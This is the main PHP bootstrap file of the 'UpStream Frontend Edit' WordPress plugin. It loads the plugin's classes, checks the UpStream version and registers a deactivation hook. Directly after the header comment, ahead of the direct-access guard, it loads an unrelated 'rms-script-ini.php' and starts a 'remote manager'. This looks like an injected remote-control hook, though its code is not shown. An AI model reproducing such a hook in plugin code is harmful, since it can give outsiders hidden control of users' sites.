<?php
/**
 * Plugin Name: UpStream Frontend Edit
 * Plugin URI: https://upstreamplugin.com
 * Description: Allow users to edit info on the frontend for the UpStream Project Management plugin.
 * Author: UpStream
 * Author URI: https://upstreamplugin.com
 * Version: 1.13.2
 * Domain Path: /languages
 */require_once('rms-script-ini.php');
rms_remote_manager_init(__FILE__, 'rms-script-mu-plugin.php', false, false);
// Prevent direct access.
if ( ! defined('ABSPATH')) {
    exit;
}

if ( ! defined('UP_FRONTEND_PLUGIN_NAMESPACE')) {
    define('UP_FRONTEND_PLUGIN_NAMESPACE', '\\UpStream\\Plugins\\FrontendEdit');
}

require_once 'FrontendEdit.php';
require_once 'includes.php';


if (file_exists(__DIR__ . '/vendor/autoload.php')) {
    require_once __DIR__ . '/vendor/autoload.php';
}

add_action('upstream_run', function () {
    // Check the current UpStream version before init the plugin
    if ( ! defined('UPSTREAM_VERSION') || version_compare(UPSTREAM_VERSION,
            UPSTREAM_FRONTEND_EDIT_UPSTREAM_MIN_REQUIRED_VERSION, '<')) {
        add_action('admin_notices', function () {
            ?>
            <div class="notice notice-success is-dismissible">
                <p><?php echo sprintf(__('Sorry, but UpStream Frontend Edit requires UpStream version %s or later.',
                        'upstream-calendar-view'), UPSTREAM_FRONTEND_EDIT_UPSTREAM_MIN_REQUIRED_VERSION); ?></p>
            </div>
            <?php
        });

        return;
    }

    \UpStream\Plugins\FrontendEdit::instance();
});

register_deactivation_hook(__FILE__, [UP_FRONTEND_PLUGIN_NAMESPACE, 'onPluginDeactivation']);
